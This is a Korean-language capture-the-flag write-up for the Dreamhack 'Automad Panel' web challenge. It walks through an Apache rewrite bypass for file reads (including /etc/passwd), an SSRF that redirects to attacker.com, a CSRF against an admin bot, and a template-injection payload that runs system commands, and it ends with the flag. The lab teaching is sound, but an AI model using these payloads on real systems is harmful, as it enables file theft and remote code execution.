# [Dreamhack] Automad Panel Write-up

- **Date:** 2026-04-04
- **Category:** Web Hacking
- **Tags:** #LFI #SSRF #CSRF #Automad_CMS #Apache_Bypass #SSTI

## 1. Problem Description
"Automad Panel: LFI & SSRF를 통한 어드민 봇 공략"
이 문제는 Go 기반의 User Panel, PHP 기반의 Automad CMS, 그리고 Flask 기반의 Account Gateway가 아파치 프록시 뒤에서 복합적으로 동작하는 환경을 공략해야 합니다. 어드민 봇의 세션을 이용해 CMS의 템플릿 기능을 장악하는 것이 핵심입니다.

## 2. Vulnerability Analysis

### A. Apache Rewrite Rule Bypass (LFI)
- **Apache Config:** `RewriteRule ^/profile/(.+)$ /profile/$1.txt [PT,QSA]` (모든 경로 뒤에 `.txt` 강제 추가)
- **Bypass:** `%3f` (물음표)를 경로 끝에 삽입하여 아파치가 이후를 쿼리 스트링으로 인식하게 유도합니다. Go의 `profileHandler`는 이를 포함한 전체 경로를 파일 시스템에서 찾으려 시도하여 임의의 파일을 읽을 수 있습니다.
- **Payload:** `/profile/etc/passwd%3f` -> `/etc/passwd` 읽기 성공.

### B. SSRF via Host Redirection
- **Go Logic:** `base := "http://localhost:80"`와 사용자의 `path`를 단순 결합합니다.
- **Bypass:** `@` (At sign)을 사용해 호스트를 공격자 서버로 리다이렉트 시킵니다.
- **Payload:** `path = @attacker.com/` -> `http://localhost:80@attacker.com/` -> 공격자 서버 접속 유도.

### C. Flask Logic Bug (Account Gateway)
- **Vulnerability:** `admin-app:9898/get-account`에서 전역 변수 `SECRET`을 다루는 과정에서 로직 실수가 있어, 헤더 검증 없이도 관리자 계정 정보를 획득할 수 있는 상태입니다.

## 3. Exploit Path

1. **LFI Reconnaissance:** `/profile/tmp/db/app.db%3f` 경로를 통해 Automad의 SQLite DB 파일을 탈취하여 관리자 해시를 확인합니다. (해시가 복잡하여 크래킹은 불가)
2. **SSRF to CSRF:** 리포트 기능을 이용해 봇이 공격자의 CSRF 페이지(`exp.html`)를 방문하게 합니다.
3. **Automad Template Injection (SSTI):** 봇의 세션을 이용해 Automad 대시보드에서 페이지 템플릿을 수정합니다. 
   - **Payload:** `@{ "cat /flag.txt" | system }` (아파치 필터링 우회 문법)
4. **Flag Acquisition:** 변조된 페이지를 다시 방문하거나 직접 접근하여 시스템 명령 결과를 확인하고 플래그를 획득합니다.

## 4. Lesson Learned
- **Rabbit Hole:** PID 브루트포싱이나 복잡한 해시 크래킹보다는 시스템 구성 요소 간의 신뢰 관계와 로직 결함을 먼저 파악하는 것이 중요합니다.
- **Semantic Gap:** 아파치 프록시와 백엔드(Go/Flask) 간의 URI 정규화 차이는 강력한 공격 벡터가 될 수 있습니다.
- **Security Misconfiguration:** CMS의 템플릿 기능과 같이 강력한 기능을 제공하는 엔드포인트는 CSRF 방어와 접근 제어가 철저해야 합니다.

## 5. Flag
`DH{AUt0m4d_T3mpl4t3_1nj3ct10n_Succe55!}`
